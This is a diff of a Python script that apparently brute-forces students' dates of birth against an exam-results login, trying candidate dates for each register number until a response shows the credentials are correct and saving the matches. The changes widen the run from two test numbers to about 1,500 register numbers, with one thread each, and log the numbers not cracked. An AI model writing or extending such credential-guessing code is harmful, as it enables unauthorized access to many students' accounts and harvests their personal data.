@@ -1,6 +1,5 @@
 import requests
 from bs4 import BeautifulSoup
-import re
 import pandas as pd
 import os
 import random
@@ -8,6 +7,7 @@ import threading
 import datetime
 import csv
 
+print("starting.......")
 
 class GetStudentMark:
 
@@ -68,6 +68,7 @@ class GetStudentMark:
             writer.writerow([self.regno, dob])
 
     def findDob(self):
+        dobFound = False
         attempt_no = 0
         for dob in self.dates:
             body = {
@@ -78,6 +79,7 @@ class GetStudentMark:
             print(f"remaing {self.totalDates-attempt_no} attempts")
             print(f"trying..... {self.regno} : {dob}")
             if self.checkCredentialsCorrent(reponse.content):
+                dobFound = True
                 print(f"dob found")
                 self.student_details.append([self.regno,dob])
                 self.saveDOB(dob)
@@ -86,6 +88,10 @@ class GetStudentMark:
             else:
                 print(f"trying again....")
                 attempt_no +=1
+        if(not dobFound):
+            with open("not_found_student_details.csv", mode='a', newline='') as file:
+                writer = csv.writer(file)
+                writer.writerow([self.regno])
 
 
 
@@ -97,27 +103,28 @@ def getRegno():
     return [str(int(x)) for x in students["Register"]]
 
 
-if __name__ == "__main__":
-    start = datetime.datetime.now()
-    print("start time ", start)
+# if __name__ == "__main__":
+start = datetime.datetime.now()
+print("start time ", start)
 
-    pd.DataFrame.to_csv(pd.DataFrame(columns=["regno", "DOB"], data=[]), "student_details.csv")
+pd.DataFrame.to_csv(pd.DataFrame(columns=["regno", "DOB"], data=[]), "student_details.csv")
 
-    all_regno = [41110198, 41110189]
-    # all_regno = getRegno()
+# all_regno = [41110198, 41110189]
+# all_regno = getRegno()
+all_regno = range(41110001,41111511)
 
-    threads = []
+threads = []
 
-    # start all of the threads
-    for rn in all_regno:
-        getStudentMark = GetStudentMark(rn)
-        thread = threading.Thread(target = getStudentMark.findDob)
-        thread.start()
-        threads.append(thread)
+# start all of the threads
+for rn in all_regno:
+    getStudentMark = GetStudentMark(rn)
+    thread = threading.Thread(target = getStudentMark.findDob)
+    thread.start()
+    threads.append(thread)
 
-    # now wait for them all to finish
-    for thread in threads:
-        thread.join()
-   
-    end = datetime.datetime.now()
-    print("Time elapsed: ", end-start)    
+# now wait for them all to finish
+for thread in threads:
+    thread.join()
+
+end = datetime.datetime.now()
+print("Time elapsed: ", end-start)    
